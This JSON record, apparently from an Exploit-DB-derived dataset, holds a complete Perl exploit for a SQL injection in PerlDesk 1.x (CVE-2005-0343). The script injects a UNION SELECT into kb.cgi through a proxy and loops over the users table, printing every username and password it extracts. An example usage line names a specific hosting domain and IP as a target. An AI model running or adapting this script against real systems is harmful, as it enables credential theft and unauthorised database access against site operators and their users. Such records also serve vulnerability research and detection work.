{
  "id": "790",
  "title": "PerlDesk 1.x - SQL Injection",
  "cve": "CVE-2005-0343",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n\r\n# Example:\r\n# kb.cgi?view=0 UNION SELECT 1,3,password,username,3,7 FROM users\r\n\r\n# Exploit is attached.\r\n# ./pde.pl www.internethosting4u.com /perldesk/kb.cgi 148.244.150.58:80\r\n\r\nuse IO::Socket;\r\n\r\nprint '\r\n########################################################\r\n# PerlDesk exploit\r\n#\r\n# Usage: ./pdsploit.pl host path proxy\r\n#\r\n#\r\n#\r\n# Vunerability discovered by\r\n#\r\n# deluxe89 and Astovidatu [ www.security-project.org ]\r\n#\r\n#\r\n#\r\n# Special thanks to doc and WebDoctor\u00b4s\r\n#\r\n########################################################\r\n\r\n';\r\n\r\nif($#ARGV != 2)\r\n{\r\n       exit;\r\n}\r\n\r\n$host = $ARGV[0];\r\n$path = $ARGV[1];\r\n$proxy = $ARGV[2];\r\n($addr, $port) = split(/:/, $proxy);\r\n\r\n$offset = 0;\r\n\r\nwhile(1)\r\n{\r\n       $value =\r\n\"view=0%20UNION%20SELECT%20'0','0',CONCAT('_P',password,'P_'),CONCAT('_U',username,'U_'),'0','0'%20FROM%20users%20LIMIT%20$offset,1\";\r\n\r\n       $socket = IO::Socket::INET->new(Proto => \"tcp\",\r\nPeerAddr => $addr, PeerPort => $port) || die \"[-]\r\nProxy doesn't work\\n\";\r\n       print $socket \"GET http://$host$path?$value\r\nHTTP/1.1\\nHost: $host\\n\\n\";\r\n\r\n       $user = '';\r\n       $pass = '';\r\n       while(defined(my $data = <$socket>))\r\n       {\r\n               if($data =~ m/_P(.*)P_/)\r\n               {\r\n                       $pass = $1;\r\n               }\r\n               if($data =~ m/_U(.*)U_/)\r\n               {\r\n                       $user = $1;\r\n               }\r\n       }\r\n\r\n       if($user ne '' && $pass ne '')\r\n       {\r\n               print \"$user:$pass\\n\";\r\n       }\r\n       else\r\n       {\r\n               die \"[+] Finished\\n\";\r\n       }\r\n\r\n       $offset++;\r\n}\r\n\r\n# code by deluxe89 [ www.security-project.org ]\r\n\r\n# milw0rm.com [2005-02-05]",
  "url": "https://www.exploit-db.com/exploits/790"
}